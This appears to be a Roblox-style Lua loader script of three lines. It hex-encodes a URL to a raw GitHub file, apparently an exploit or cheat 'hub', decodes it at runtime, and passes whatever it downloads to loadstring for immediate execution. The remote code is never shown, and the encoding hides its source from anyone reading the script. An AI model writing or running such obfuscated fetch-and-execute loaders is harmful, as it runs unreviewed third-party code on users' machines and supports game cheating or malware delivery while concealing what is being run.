local _hex = "68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6a6170616e6a706a706a702f4a6170616e2d6875622d6a702e6a612f6d61696e2f4a6170616e5f6875625f6a702e6a612e4c7561"
local _url = _hex:gsub("%x%x", function(c) return string.char(tonumber(c, 16)) end)
loadstring(game:HttpGet(_url))()
